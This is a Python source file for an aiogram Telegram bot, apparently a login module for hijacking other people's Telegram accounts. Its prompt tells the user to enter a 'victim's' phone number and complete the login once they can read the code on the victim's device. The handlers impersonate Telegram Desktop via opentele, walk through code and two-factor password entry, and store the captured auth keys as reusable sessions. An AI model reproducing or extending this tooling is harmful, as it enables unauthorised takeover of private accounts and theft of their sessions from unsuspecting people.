import logging

from aiogram import F, Router
from aiogram.fsm.context import FSMContext
from aiogram.types import CallbackQuery, Message
from opentele.api import API
from pyrogram import enums
from pyrogram.errors import BadRequest, SessionPasswordNeeded

from bot import keyboards as kb
from bot.core.db.repo import Repo
from bot.core.session.auth import AuthManager
from bot.core.session.enums import SessionSource
from bot.core.session.session import SessionManager
from bot.misc.states import LoginStates

from .menu import text_session

logger = logging.getLogger(__name__)

router = Router()


@router.message(F.text == "🆕 Войти")
async def login_handler(message: Message):
    await message.answer(
        "Выбери тип авторизации\n(Скоро будет доступен вход по QR)",
        reply_markup=kb.sessions.auth_type(),
    )


@router.callback_query(F.data == "login_phone")
async def login_phone_handler(query: CallbackQuery, state: FSMContext):
    await query.answer()
    await state.set_state(LoginStates.phone_number)
    await query.message.edit_text(
        "Если ты хочешь зайти в чужой телеграм, введи номер жертвы\n\n"
        "Затем когда будет доступ к ее телефону или телеграму, посмотри код и заверши вход\n\n"
        "☎️ Введи номер телефона:"
    )


@router.message(LoginStates.phone_number)
async def phone_number_handler(message: Message, state: FSMContext):
    phone_number = "".join(x for x in message.text if x.isdigit())
    await state.update_data(phone_number=phone_number)
    await message.answer(
        f"Телефон <code>{phone_number}</code> коректен?",
        reply_markup=kb.sessions.phone_confirm(),
    )
    await state.set_state(LoginStates.phone_confirm)


@router.callback_query(F.data == "phone_cancel", LoginStates.phone_confirm)
async def phone_cancel_handler(query: CallbackQuery, state: FSMContext):
    await state.clear()
    await query.message.edit_text("❌ Отменено")


@router.callback_query(F.data == "phone_confirm", LoginStates.phone_confirm)
async def phone_confirm_handler(
    query: CallbackQuery, state: FSMContext, auth_manager: AuthManager
):
    data = await state.get_data()
    api = API.TelegramDesktop.Generate(system="windows")
    client = await auth_manager.create(
        user_id=query.from_user.id, api=api, phone_number=data["phone_number"]
    )

    try:
        sent_code = await client.send_code(phone_number=client.phone_number)

    except BadRequest as e:
        await query.message.edit_text(f"❌ Ошибка:\n<b>{e.MESSAGE}</b>")
        await state.clear()

    else:
        sent_code_descriptions = {
            enums.SentCodeType.APP: "Telegram app",
            enums.SentCodeType.SMS: "SMS",
            enums.SentCodeType.CALL: "phone call",
            enums.SentCodeType.FLASH_CALL: "phone flash call",
            enums.SentCodeType.FRAGMENT_SMS: "Fragment SMS",
        }

        await state.set_state(LoginStates.phone_code)
        await state.update_data(phone_code_hash=sent_code.phone_code_hash)
        await query.message.edit_text(
            f"Код подтверждения отправлен через {sent_code_descriptions[sent_code.type]}\n"
            "🔑 Введите код:",
            reply_markup=kb.main_menu.close(),
        )


@router.message(F.text, LoginStates.phone_code)
async def phone_code_handler(
    message: Message, state: FSMContext, repo: Repo, auth_manager: AuthManager
):
    data = await state.get_data()
    client = auth_manager.get(message.from_user.id)

    try:
        signed_in = await client.sign_in(
            client.phone_number, data["phone_code_hash"], message.text
        )

    except BadRequest as e:
        await message.answer(
            f"❌ Ошибка:\n<b>{e.MESSAGE}</b>\n\nПопробуйте еще раз",
            reply_markup=kb.main_menu.close(),
        )

    except SessionPasswordNeeded:
        await state.set_state(LoginStates.password)
        hint = await client.get_password_hint()
        await message.answer(
            f"Подсказка: {hint}\n"
            "🔑 Двухэтапная проверка включена, и требуется ввести пароль:",
            reply_markup=kb.main_menu.close(),
        )

    else:
        await state.clear()
        manager = SessionManager(
            dc_id=await client.storage.dc_id(),
            auth_key=await client.storage.auth_key(),
            user_id=signed_in.id,
            source=SessionSource.LOGIN_PHONE,
        )
        session = await repo.session.add_from_manager(message.from_user.id, manager)
        await auth_manager.close(message.from_user.id)

        await message.answer(
            text=text_session(manager), reply_markup=kb.sessions.action(session.id)
        )


@router.message(LoginStates.password)
async def upload_session_handler(
    message: Message, state: FSMContext, repo: Repo, auth_manager: AuthManager
):
    client = auth_manager.get(message.from_user.id)

    try:
        signed_in = await client.check_password(message.text)

    except BadRequest as e:
        await message.answer(
            f"❌ Ошибка:\n<b>{e.MESSAGE}</b>\n\nПопробуй еще раз",
            reply_markup=kb.main_menu.close(),
        )

    else:
        await state.clear()
        manager = SessionManager(
            dc_id=await client.storage.dc_id(),
            auth_key=await client.storage.auth_key(),
            user_id=signed_in.id,
            valid=True,
            first_name=client.me.first_name,
            last_name=client.me.last_name,
            username=client.me.username,
            phone=client.me.phone_number,
        )
        session = await repo.session.add_from_manager(message.from_user.id, manager)
        await auth_manager.close(message.from_user.id)

        await message.answer(
            text_session(manager), reply_markup=kb.sessions.action(session.id)
        )
